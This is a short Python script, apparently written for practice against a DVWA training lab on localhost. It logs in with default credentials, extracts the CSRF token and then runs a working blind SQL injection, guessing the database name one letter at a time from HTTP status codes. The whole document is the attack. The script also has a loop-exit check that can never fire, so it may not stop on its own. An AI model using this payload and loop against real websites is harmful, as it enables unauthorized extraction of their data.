import requests
from bs4 import BeautifulSoup
import lxml
session = requests.Session()

url = "http://localhost/login.php"
soup = BeautifulSoup(session.get(url).text,"lxml")
csrf = soup.find("input",{"name":"user_token"})["value"]

payload= {"username":"admin","password":"password","Login":"Login"}


with session as c:
    r = c.get(url)
    soup = BeautifulSoup(session.get(url).text,"lxml")
    csrf = soup.find("input",{"name":"user_token"})["value"]
    payload["user_token"] = csrf
    loginrequest = c.post(url,data=payload)
    #r = c.get('http://localhost/vulnerabilities/sqli_blind/')
    alphabet=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    name=[]
    namelen = len(name) + 1
    i = 0
    while True:
        for letter in alphabet:

            payload1 = {'id':f"'or substring(database(), {namelen},1) = '{letter}'#--","Submit":"Submit"}
            sqlUrl = 'http://localhost/vulnerabilities/sqli_blind/'
            r = c.get(sqlUrl,params=payload1)
            if(r.status_code == 200):
                print(namelen)
                print(r.status_code)
                print(letter)
                namelen = namelen + 1
                name.append(letter)
                print(name)
                print(f"{i} This is i")
                i = 0
                break
            elif(r.status_code == 404):
                i = 1 + i
                continue
        if(i>len(alphabet)):
            break
print(name)
